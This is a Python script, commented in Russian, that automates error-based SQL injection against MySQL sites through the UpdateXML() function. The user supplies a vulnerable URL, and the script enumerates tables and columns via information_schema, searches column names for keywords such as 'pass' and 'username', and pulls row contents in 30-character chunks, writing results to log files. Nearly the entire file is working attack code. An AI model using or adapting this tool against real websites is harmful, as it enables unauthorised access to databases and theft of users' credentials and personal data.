"""  Этот скрипт затрагивает тему sql инъекций основанных на выводе информации об ошибках. 

Но иногда случается так, что страндартные методы union based не работают и начиная с версии mysql 5.1, разработчики позаботились о том чтоб в

мускуле появились функции для работы с XML. Существуют различные техники эксплуации, данный пример мы рассмотрим на базе функции UpdateXML(). 

Этого будет вполне достаточно, ведь их всех объединяет один недостаток - слишком малое количество символов на вывод. В данном скрипте показан

подход к решению данной проблеммы, с его помощью в считанные минуты можно получить таблицы с именами колонок, а так же в процессе спарсить 

имена этих колонок по ключевым словам. Данный код является примером и не претендует на готовый продукт.  """

import re
import requests
import random
import os
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

POOLCOUNTS = 16 # Тут мы указываем количество потоков и процессов 

tblnum_start = '1' # Забиваем с какого номера таблицы начинаем, 1 по умолчанию

tbldata = [] # Тут появиться список с названиями таблиц которые мы будем исследовать

tbldata2 = '' # Переменная для временного хранения имени таблицы

colnum = [] # Здесь появиться список номеров таблиц

colname = [] # Имена колонок в таблице

x2 = [] # Данные из таблицы

rn = 0 # Случайный номер записи в таблице

""" Получаем путь к директории откуда выполняется скрипт """
fpath = os.path.realpath(__file__)
scrpath = os.path.dirname(fpath) # Переменная хранит путь к директории

""" Проверяем наличие лог файлов, если они существуют, дабы случайно не избавиться от чего то важного переименовываем их. """
if os.path.isfile(scrpath + "/log_columnname.txt") == True :
    os.rename(scrpath + "/log_columnname.txt",scrpath + "/log_columnname_bak.txt")
if os.path.isfile(scrpath + "/log_parsed.txt") == True :
    os.rename(scrpath + "/log_parsed.txt",scrpath + "/log_parsed_bak.txt")

""" Здесь мы объявляем переменную vulnUrl которая принимает путь к уязвимому параметру, а так же переменную rvulnUrl - в неё будут помещаться
готовые sql инъекции  """
vulnUrl = input('Введи полный урл, рядом с уязвимым параметром впиши {inj} ( пример: https://test.test/test.php?id=1{inj} ): ')
rvulnUrl = ''
vulntest = re.search(r'{inj}',vulnUrl)
if vulnUrl == '' or str(vulntest) == 'None':
    print('Нет URL либо не указал уязвимый параметр')
    exit()
vulntest = re.sub(r'{inj}', '',vulnUrl)
if requests.get(vulntest).status_code != 200:
    print('URL недоступен.')
    exit()

""" Тут узнаём необходимо ли отпарсить имена колонок на определённые символы, задаём список. """
parselist = input('Введи символы которые должны встречаться в именах колонок через пробел либо оставь поле пустым ( пример: pass username Pass ): ').split()
if len(parselist) > 0:
    print('Список поиска в колонках: ' + str(parselist))

def GetTAB(nCNF):# Читаем таблицы из базы
    
    """Подготавливаем SQL запрос, здесь он указан в таком виде, это можно подкорректировать под конкретный частный случай."""
    table_name = '\' or updatexml(1,concat(0x7e,(SELECT concat_ws(char(124),table_name) FROM information_schema.tables LIMIT '+ str(nCNF) + ', 1)),0) or \''
    
    """Здесь мы собираем готовую инъекцию. """
    rvulnUrl = re.sub(r"\{inj\}", table_name ,vulnUrl)

    """А здесь отправляем запрос. """
    resp01 = requests.get(rvulnUrl)
  
    """ Ниже мы парсим search() нужные нам строки из ответа,
    а так же чистим всё лишнее фукцией sub(),
    чтоб получить чистые имена таблиц. """
        
    data = re.search(r'XPATH syntax error: \'.+\'',str(resp01.text));data = re.sub(r'XPATH syntax error: \'~|\'|\'.+','',data.group());

    tbldata.append(data)


def GetTABNUM(): # Функция получает все номера таблицы в базе, и наполняет список массивом необходимых нам номеров 
    
    global tblnum_start

    """Sql запрос который выводит количество таблиц."""
    count_get = '\' or updatexml(1,concat(0x7e,(SELECT concat_ws(char(124),count(1)) FROM information_schema.tables)),0) or \''

    rvulnUrl = re.sub(r"\{inj\}", count_get ,vulnUrl) 

    resp01 = requests.get(rvulnUrl)

    """Теперь с помощью заранее подготовленного регулярного выражения XPATH syntax error: \'.+\'
    мы найдём нужный нам фрагмент и с помощью функции sub() зарежем её до совсем чистейшего вида.
    Регулярку нужно подготавливать заранее, посмотрев как выглядит ответ. Но можно и собрать очень
    универсальную, всё зависит от твоей фантазии."""
    data = re.search(r'XPATH syntax error: \'.+\'',str(resp01.text));data = re.sub(r'XPATH syntax error: \'~|\'|\'.+','',data.group());

    if data.isdigit() != True:

        print(f'Подкорректируй регулярные выражения под свой вывод ошибки. - {data}')
        exit()

    tblnum_end = int (data)

    if int(tblnum_end) > 5 and int(tblnum_end) != 0:      
        print(f'{tblnum_end} - таблиц в БД.\n' ) 

        tblnum_start = input('Введи номер таблицы с которого необходимо начать: ') 
        
    else:      
        print(f'{tblnum_end} - таблицы в БД.\n' )

        tblnum_start = input('Введи номер таблицы с которого необходимо начать: ')    

    if int(tblnum_end) < int(tblnum_start):
            
        print('Номер стартовой таблицы больше конечного.')
            
        exit()

    """Наполняем список colnum []"""
    for k in range(int(tblnum_start),tblnum_end,1): 
        colnum.append(k)


def GetTABColNum(tabname): # Функция возвращает количество колонок заданной таблицы

    """ Переводим название таблицы в ASCII """
    tntoascii = tabname;tntoascii = 'CHAR('+''.join(str(ord(i)) + ',' for i in tntoascii);tntoascii = tntoascii[:-1] + ')';

    """ SQL запрос """
    column_count = '\' or updatexml(1,concat(0x7e,(SELECT concat_ws(char(124),count(1)) FROM information_schema.columns where table_name=' + str(tntoascii) + ')),0) or \''

    rvulnUrl = re.sub(r"\{inj\}", column_count ,vulnUrl)

    resp01 = requests.get(rvulnUrl)
    
    data = re.search(r'XPATH syntax error: \'.+\'',str(resp01.text));data = re.sub(r'XPATH syntax error: \'~|\'|\'.+','',data.group());
    
    cnum = int(data)
    
    return cnum # возвращаем количество колонок   

    
def GetTABColName(count1): # Функция получает имена колонок таблицы 

    tntoascii = tbldata2;tntoascii = 'CHAR('+''.join(str(ord(i)) + ',' for i in tntoascii);tntoascii = tntoascii[:-1] + ')';

    """ SQL запрос """
    column_name = '\' or updatexml(1,concat(0x7e,(SELECT concat_ws(char(124),column_name) FROM information_schema.columns where table_name=' + str(tntoascii) + ' limit ' + str(count1) + ',1)),0) or \''

    rvulnUrl = re.sub(r"\{inj\}", column_name ,vulnUrl)

    resp01 = requests.get(rvulnUrl)
    
    data = re.search(r'XPATH syntax error: \'.+\'',str(resp01.text));data = re.sub(r'XPATH syntax error: \'~|\'|\'.+','',data.group());
    
    colname.append(data) # и наполняет список colname


def findsymb(pl2): # Функция ищет совпадения в колонках, в качестве аргумента принимает символы из списка parselist

    global colname, tbldata2, tbldata3, rn

    parseres = re.search(pl2,str(colname))
    print(f"Набор символов {parseres.group()} найден в таблице {tbldata2}\n")
    tbldata3 = tbldata2

    """ Первым делом узнаём сколько записей в таблице"""
    inject1 = f'\' or updatexml(1,concat(0x7e,(SELECT concat_ws(char(124),count(1)) FROM {tbldata3})),0) or \''

    rvulnUrl = re.sub(r"\{inj\}",  inject1 ,vulnUrl)
    
    resp01 = requests.get(rvulnUrl)
    
    nw = re.search(r'XPATH syntax error: \'.+\'',str(resp01.text));nw = re.sub(r'XPATH syntax error: \'~|\'|\'.+','',nw.group());

    """ Генерируем случайное число от 0 до крайнего номера записи в таблице"""
    rn = random.randint(0,int(nw))

    with ThreadPoolExecutor(max_workers=POOLCOUNTS) as p:
        p.map(randomdata,colname)
    with open(scrpath + "/log_parsed.txt","a+") as f1:
        f1.write(f'Совпадение:{parseres.group()}\nTABLE: {tbldata3}\nCOLUMNS: {colname}\nNUM: {rn} from {nw}.\nDATA: {str(x2)}\n\n')
    rn = 0    


def randomdata(cln): # Функция для извлечения данных их таблицы в случайном порядке

    global x2, tbldata3, vulnUrl, rn

    """ Преобразуем в ASCII """
    ttoascii = cln;ttoascii = 'CHAR('+''.join(str(ord(i)) + ',' for i in ttoascii);ttoascii = ttoascii[:-1] + ')';

    """ Тут используя функцию CHAR_LENGTH узнаём сколько у нас символов в записи ttoascii под случайным номером rn """
    inject1 = f'\' or updatexml(1,concat(0x7e,(SELECT concat_ws(char(124),CHAR_LENGTH({ttoascii})) FROM {tbldata3} limit {rn},1)),0) or \''

    rvulnUrl = re.sub(r"\{inj\}", inject1 ,vulnUrl)

    resp01 = requests.get(rvulnUrl)
    
    columnlen = re.search(r'XPATH syntax error: \'.+\'',str(resp01.text));columnlen = re.sub(r'XPATH syntax error: \'~|\'|\'.+','',columnlen.group());
   
    """ Обычно updatexml() выводит до 31 симовола, максимальное количество символов которое может хранить колонка
    64. Зная вышеописанное, собираем набор условий и наполняем список x2 ."""
    if int(columnlen) <= 30:

        inject1 = f'\' or updatexml(1,concat(0x7e,(SELECT concat_ws(char(124),{cln}) FROM {tbldata3} limit {rn},1)),0) or \''

        rvulnUrl = re.sub(r"\{inj\}", inject1 ,vulnUrl)

        resp01 = requests.get(rvulnUrl)
    
        data = re.search(r'XPATH syntax error: \'.+\'',str(resp01.text));data = re.sub(r'XPATH syntax error: \'~|\'|\'.+','',data.group());
         
        x2.append(data)
        
    
    elif int(columnlen) > 30 and int(columnlen) <= 60:

        inject1 = f'\' or updatexml(1,concat(0x7e,(SELECT concat_ws(char(124),{cln}) FROM {tbldata3} limit {rn},1)),0) or \''

        rvulnUrl = re.sub(r"\{inj\}", inject1 ,vulnUrl)

        resp01 = requests.get(rvulnUrl)
    
        data = re.search(r'XPATH syntax error: \'.+\'',str(resp01.text));data = re.sub(r'XPATH syntax error: \'~|\'|\'.+','',data.group());

        jtext = data

        inject1 = f'\' or updatexml(1,concat(0x7e,(SELECT concat_ws(char(124),substr({cln},31)) FROM {tbldata3} limit {rn},1)),0) or \''

        rvulnUrl = re.sub(r"\{inj\}", inject1 ,vulnUrl)

        resp01 = requests.get(rvulnUrl)
    
        data = re.search(r'XPATH syntax error: \'.+\'',str(resp01.text));data = re.sub(r'XPATH syntax error: \'~|\'|\'.+','',data.group());

        jtext += data

        x2.append(jtext)

    elif int(columnlen) > 60:

        inject1 = f'\' or updatexml(1,concat(0x7e,(SELECT concat_ws(char(124),{cln}) FROM {tbldata3} limit {rn},1)),0) or \''

        rvulnUrl = re.sub(r"\{inj\}", inject1 ,vulnUrl)

        resp01 = requests.get(rvulnUrl)
    
        data = re.search(r'XPATH syntax error: \'.+\'',str(resp01.text));data = re.sub(r'XPATH syntax error: \'~|\'|\'.+','',data.group());

        jtext = data

        inject1 = f'\' or updatexml(1,concat(0x7e,(SELECT concat_ws(char(124),substr({cln},31)) FROM {tbldata3} limit {rn},1)),0) or \''

        rvulnUrl = re.sub(r"\{inj\}", inject1 ,vulnUrl)

        resp01 = requests.get(rvulnUrl)
    
        data = re.search(r'XPATH syntax error: \'.+\'',str(resp01.text));data = re.sub(r'XPATH syntax error: \'~|\'|\'.+','',data.group());

        jtext += data

        inject1 = f'\' or updatexml(1,concat(0x7e,(SELECT concat_ws(char(124),substr({cln},61)) FROM {tbldata3} limit {rn},1)),0) or \''

        rvulnUrl = re.sub(r"\{inj\}", inject1 ,vulnUrl)

        resp01 = requests.get(rvulnUrl)
    
        data = re.search(r'XPATH syntax error: \'.+\'',str(resp01.text));data = re.sub(r'XPATH syntax error: \'~|\'|\'.+','',data.group());  
        
        jtext += data

        x2.append(jtext)   
    

def strProc(tbld): # Данная функция принимает имя таблицы и запускает дальнейшие процессы для получения количества колонок и их имена

    global colname, tbldata2, parselist
    
    x = []

    result = GetTABColNum(tbld)
    
    for _ in range(result):
        x.append(_)
    
    tbldata2 = tbld
    
    with ThreadPoolExecutor(max_workers=POOLCOUNTS) as pool12:    
        pool12.map(GetTABColName,x)

    print(tbldata2 + '  ' + str(result)+ ' ' + str(colname))
    
    with open(scrpath + "/log_columnname.txt","a+") as f1: 
        f1.write(tbldata2 + '  ' + str(result)+ ' ' + str(colname)+'\n\n')

    with ThreadPoolExecutor(max_workers=POOLCOUNTS) as exec11:
        exec11.map(findsymb,parselist)          
        
    """Обнуляем переменные"""
    colname = []     
    x = []

GetTABNUM()

with ThreadPoolExecutor(max_workers=POOLCOUNTS) as pool:
    pool.map(GetTAB,colnum)

with ProcessPoolExecutor(max_workers=POOLCOUNTS) as tr:
    tr.map(strProc,tbldata)